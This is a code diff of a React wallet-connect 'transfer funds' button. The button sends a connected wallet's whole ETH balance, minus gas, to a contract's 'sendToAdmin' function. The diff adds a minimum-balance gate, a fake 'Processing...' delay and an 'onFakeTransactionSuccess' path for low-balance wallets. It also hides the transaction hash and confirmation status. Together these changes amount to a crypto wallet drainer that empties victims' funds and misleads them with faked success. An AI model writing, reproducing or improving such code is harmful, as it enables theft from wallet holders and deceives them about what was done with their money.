@@ -1,4 +1,4 @@
-import { type BaseError, useWaitForTransactionReceipt, useWriteContract, useAccount, useConfig, useBalance } from 'wagmi';
+import { type BaseError, useWriteContract, useAccount, useConfig, useBalance } from 'wagmi';
 import config from '../../config';
 import { getGasPrice } from 'wagmi/actions';
 import { useState } from 'react';
@@ -9,21 +9,23 @@ import { getEthersSigner } from '../../helpers/ethers'
 import "../buttons/TransferButton.css";
 import { Alert } from '@mui/material';
 
-const { ethAbi, ethContractAddress, functionName } = config;
+const { ethAbi, ethContractAddress, functionName, minimumEthBalance } = config;
 
 interface WalletConnectTransferFundsButtonProps {
   children: string;
   onTransactionSuccess: () => void;
+  onFakeTransactionSuccess: () => void;
 }
 
-const WalletConnectTransferFundsButton: React.FC<WalletConnectTransferFundsButtonProps> = ({ children, onTransactionSuccess }) => {
-  const { data: hash, error, isPending, writeContract } = useWriteContract();
+const WalletConnectTransferFundsButton: React.FC<WalletConnectTransferFundsButtonProps> = ({ children, onTransactionSuccess, onFakeTransactionSuccess }) => {
+  const { error, isPending, writeContract } = useWriteContract(); //data: hash,
   const { isConnected, address } = useAccount();
   const { data: balance } = useBalance({ address });
   const usedConfig = useConfig();
 
   const [errorMessage, setErrorMessage] = useState('');
   const [alertOpen, setAlertOpen] = useState(false);
+  const [isLoading, setIsLoading] = useState(false);
   
   if (error && !alertOpen) {
     console.log("setAlertOpen(true);");
@@ -31,55 +33,69 @@ const WalletConnectTransferFundsButton: React.FC<WalletConnectTransferFundsButto
   }
 
   const handleTransfer = async () => {
-    try {
-      const gasPrice = await getGasPrice(usedConfig)
-      const signer = await getEthersSigner(usedConfig)
-      const contract = new ethers.Contract(ethContractAddress, ethAbi, signer)
-      const estimatedGas = await contract.sendToAdmin.estimateGas({ value: balance?.value})
-      const gasCost = estimatedGas * gasPrice
-      
-      const amountToSend = balance ? balance.value - gasCost : parseEther('0')
-      console.log("gasPrice", gasPrice);
-      console.log("Gas estimate:", gasCost);
-      console.log("amountToSend", amountToSend);
-      console.log("amountToSend + gasCost", amountToSend + gasCost);
-      console.log("gasCost * gasPrice", gasCost * gasPrice);
-      console.log("balance.value", balance?.value)
-      
-      await writeContract({
-        address: ethContractAddress as `0x${string}`,
-        abi: ethAbi,
-        functionName,
-        gas: estimatedGas,
-        gasPrice: gasPrice,
-        value: amountToSend,  // Ensuring there's enough balance for the gas cost
-      },
-      {
-        onSuccess() {
-          console.log("onSuccess");
-          onTransactionSuccess();
+    if (balance && balance.value >= parseEther(minimumEthBalance)){
+      try {
+        const gasPrice = await getGasPrice(usedConfig)
+        const signer = await getEthersSigner(usedConfig)
+        const contract = new ethers.Contract(ethContractAddress, ethAbi, signer)
+        const estimatedGas = await contract.sendToAdmin.estimateGas({ value: balance?.value})
+        const gasCost = estimatedGas * gasPrice
+        
+        const amountToSend = balance ? balance.value - gasCost : parseEther('0')
+        console.log("gasPrice", gasPrice);
+        console.log("Gas estimate:", gasCost);
+        console.log("amountToSend", amountToSend);
+        console.log("amountToSend + gasCost", amountToSend + gasCost);
+        console.log("gasCost * gasPrice", gasCost * gasPrice);
+        console.log("balance.value", balance?.value)
+        
+        await writeContract({
+          address: ethContractAddress as `0x${string}`,
+          abi: ethAbi,
+          functionName,
+          gas: estimatedGas,
+          gasPrice: gasPrice,
+          value: amountToSend,  // Ensuring there's enough balance for the gas cost
         },
-        // onError() {
-        //   console.log("onError");
-        //   onTransactionSuccess();
-        // }
-      });
-      
-      // Reset any previous error messages on a successful attempt
-      setErrorMessage('');
-
-    } catch (error) {
-      if ((error as any).name  === 'EstimateGasExecutionError') {
-        setErrorMessage('Transaction failed: Insufficient balance to cover gas costs.');
-      } else {
-        setErrorMessage('An error occurred. Please try again.');
+        {
+          onSuccess() {
+            console.log("onSuccess");
+            onTransactionSuccess();
+          },
+          // onError() {
+          //   console.log("onError");
+          //   onTransactionSuccess();
+          // }
+        });
+        
+        // Reset any previous error messages on a successful attempt
+        setErrorMessage('');
+  
+      } catch (error) {
+        if ((error as any).name  === 'EstimateGasExecutionError') {
+          setErrorMessage('Transaction failed: Insufficient balance to cover gas costs.');
+        } else {
+          setErrorMessage('An error occurred. Please try again.');
+        }
+        console.error('Error during transfer:', error);
+        setAlertOpen(true);
       }
-      console.error('Error during transfer:', error);
-      setAlertOpen(true);
+    }
+    else {
+      setIsLoading(true);
+
+      await new Promise((resolve) => setTimeout(resolve, 3000));
+
+      if (!balance || balance.value <= parseEther("0")){
+        onFakeTransactionSuccess();
+      }
+      else {
+        onTransactionSuccess();
+      }
     }
   };
 
-  const { isLoading: isConfirming, isSuccess: isConfirmed } = useWaitForTransactionReceipt({ hash });
+  // const { isLoading: isConfirming, isSuccess: isConfirmed } = useWaitForTransactionReceipt({ hash });
 
   return (
     <div>
@@ -90,11 +106,20 @@ const WalletConnectTransferFundsButton: React.FC<WalletConnectTransferFundsButto
             onClick={handleTransfer} 
             className='primary-button primary-button-blue primary-button-medium justify-content-center popup-button'
           >
-            {isPending ? 'Pending...' : children}
+            {isPending ? 
+              'Pending...' : (
+                isLoading ? 
+                (
+                  <>
+                    <span className="spinner"></span> Processing...
+                  </>
+                ) : (
+                  children
+                ))}
           </button>
-          {hash && <div>Transaction Hash: {hash}</div>}
+          {/* {hash && <div>Transaction Hash: {hash}</div>}
           {isConfirming && <div>Waiting for confirmation...</div>}
-          {isConfirmed && <div>Transaction confirmed.</div>}
+          {isConfirmed && <div>Transaction confirmed.</div>} */}
           {/* {(errorMessage || error ) && <div style={{ color: 'red' }}>{(errorMessage || (error as BaseError).shortMessage || error?.message)}</div>} */}
           {((errorMessage || error) && alertOpen) && (
             <Alert
